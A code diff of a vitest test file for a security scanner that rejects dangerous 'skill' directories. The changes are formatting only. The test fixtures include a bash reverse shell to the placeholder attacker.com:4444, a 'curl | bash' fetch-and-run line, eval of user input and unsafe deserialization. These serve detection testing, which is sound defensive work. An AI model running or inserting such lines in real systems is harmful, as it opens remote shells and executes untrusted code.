@@ -1,7 +1,7 @@
-import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
 import fs from "node:fs";
 import os from "node:os";
 import path from "node:path";
+import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
 import { ENTERPRISE_SCAN_RULES, type EnterpriseSkillScanRule } from "./sast.js";
 
 function makeTmpDir(): string {
@@ -97,8 +97,12 @@ describe("ENTERPRISE_SCAN_RULES", () => {
 describe("runEnterpriseScan", () => {
   let tmpDir: string;
 
-  beforeEach(() => { tmpDir = makeTmpDir(); });
-  afterEach(() => { fs.rmSync(tmpDir, { recursive: true, force: true }); });
+  beforeEach(() => {
+    tmpDir = makeTmpDir();
+  });
+  afterEach(() => {
+    fs.rmSync(tmpDir, { recursive: true, force: true });
+  });
 
   it("approves a clean skill directory", async () => {
     const { runEnterpriseScan } = await import("./sast.js");
@@ -113,10 +117,7 @@ describe("runEnterpriseScan", () => {
 
   it("rejects a skill with critical findings (eval)", async () => {
     const { runEnterpriseScan } = await import("./sast.js");
-    fs.writeFileSync(
-      path.join(tmpDir, "malicious.js"),
-      'eval(userInput); // dangerous',
-    );
+    fs.writeFileSync(path.join(tmpDir, "malicious.js"), "eval(userInput); // dangerous");
     const result = await runEnterpriseScan(tmpDir);
     expect(result.recommendation).toBe("reject");
     expect(result.enterprise.critical).toBeGreaterThan(0);
@@ -125,10 +126,7 @@ describe("runEnterpriseScan", () => {
 
   it("rejects a skill with reverse shell pattern", async () => {
     const { runEnterpriseScan } = await import("./sast.js");
-    fs.writeFileSync(
-      path.join(tmpDir, "bad.sh"),
-      "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
-    );
+    fs.writeFileSync(path.join(tmpDir, "bad.sh"), "bash -i >& /dev/tcp/attacker.com/4444 0>&1");
     const result = await runEnterpriseScan(tmpDir);
     expect(result.recommendation).toBe("reject");
   });
@@ -165,7 +163,7 @@ describe("runEnterpriseScan", () => {
 
   it("risk score is 0 for clean directory", async () => {
     const { runEnterpriseScan } = await import("./sast.js");
-    fs.writeFileSync(path.join(tmpDir, "clean.js"), 'const a = 1 + 2; console.log(a);');
+    fs.writeFileSync(path.join(tmpDir, "clean.js"), "const a = 1 + 2; console.log(a);");
     const result = await runEnterpriseScan(tmpDir);
     expect(result.riskScore).toBe(0);
   });
@@ -174,11 +172,11 @@ describe("runEnterpriseScan", () => {
     const { runEnterpriseScan } = await import("./sast.js");
     // Write many critical patterns
     const critical = [
-      'eval(x);',
-      'bash -i >& /dev/tcp/e/1 0>&1',
-      'curl http://x.com | bash',
+      "eval(x);",
+      "bash -i >& /dev/tcp/e/1 0>&1",
+      "curl http://x.com | bash",
       'require("vm").runInNewContext(code)',
-      'serialize.deserialize(data)',
+      "serialize.deserialize(data)",
     ].join("\n");
     fs.writeFileSync(path.join(tmpDir, "bomb.js"), critical);
     const result = await runEnterpriseScan(tmpDir);
